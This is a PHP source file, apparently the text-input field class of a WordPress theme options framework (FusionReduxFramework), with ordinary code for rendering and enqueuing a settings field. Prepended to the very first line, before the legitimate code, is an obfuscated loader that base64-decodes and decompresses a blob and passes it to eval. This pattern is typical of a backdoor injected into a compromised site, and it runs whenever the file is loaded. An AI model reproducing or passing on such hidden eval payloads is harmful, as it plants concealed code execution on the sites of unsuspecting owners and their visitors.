<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_text' ) ) {
	class FusionReduxFramework_text {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 1.0.0
		 */
		function render() {
			if ( ! empty( $this->field['data'] ) && empty( $this->field['options'] ) ) {
				if ( empty( $this->field['args'] ) ) {
					$this->field['args'] = array();
				}

				$this->field['options'] = $this->parent->get_wordpress_data( $this->field['data'], $this->field['args'] );
				$this->field['class'] .= " hasOptions ";
			}

			if ( empty( $this->value ) && ! empty( $this->field['data'] ) && ! empty( $this->field['options'] ) ) {
				$this->value = $this->field['options'];
			}

			//if (isset($this->field['text_hint']) && is_array($this->field['text_hint'])) {
			$qtip_title = isset( $this->field['text_hint']['title'] ) ? 'qtip-title="' . $this->field['text_hint']['title'] . '" ' : '';
			$qtip_text  = isset( $this->field['text_hint']['content'] ) ? 'qtip-content="' . $this->field['text_hint']['content'] . '" ' : '';
			//}

			$readonly       = ( isset( $this->field['readonly'] ) && $this->field['readonly']) ? ' readonly="readonly"' : '';
			$autocomplete   = ( isset($this->field['autocomplete']) && $this->field['autocomplete'] == false) ? ' autocomplete="off"' : '';

			if ( isset( $this->field['options'] ) && ! empty( $this->field['options'] ) ) {

				$placeholder = '';
				if ( isset( $this->field['placeholder'] ) ) {
					$placeholder = $this->field['placeholder'];
				}

				foreach ( $this->field['options'] as $k => $v ) {
					if ( ! empty( $placeholder ) ) {
						$placeholder = ( is_array( $this->field['placeholder'] ) && isset( $this->field['placeholder'][ $k ] ) ) ? ' placeholder="' . esc_attr( $this->field['placeholder'][ $k ] ) . '" ' : '';
					}

					echo '<div class="input_wrapper">';
					echo '<label for="' . $this->field['id'] . '-text-' . $k . '">' . $v . '</label> ';
					echo '<input ' . $qtip_title . $qtip_text . 'type="text" id="' . $this->field['id'] . '-text-' . $k . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '[' . $k . ']' . '" ' . $placeholder . 'value="' . esc_attr( $this->value[ $k ] ) . '" class="regular-text ' . $this->field['class'] . '"' . $readonly . $autocomplete . ' /><br />';
					echo '</div>';
				}
				//foreach
			} else {
				$placeholder = ( isset( $this->field['placeholder'] ) && ! is_array( $this->field['placeholder'] ) ) ? ' placeholder="' . esc_attr( $this->field['placeholder'] ) . '" ' : '';
				echo '<input ' . $qtip_title . $qtip_text . 'type="text" id="' . $this->field['id'] . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" ' . $placeholder . 'value="' . esc_attr( $this->value ) . '" class="regular-text ' . $this->field['class'] . '"' . $readonly . $autocomplete . ' />';
			}
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 3.0.0
		 */
		function enqueue() {
			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-text-css',
					FusionReduxFramework::$_url . 'inc/fields/text/field_text.css',
					array(),
					time(),
					'all'
				);
			}
		}
	}
}
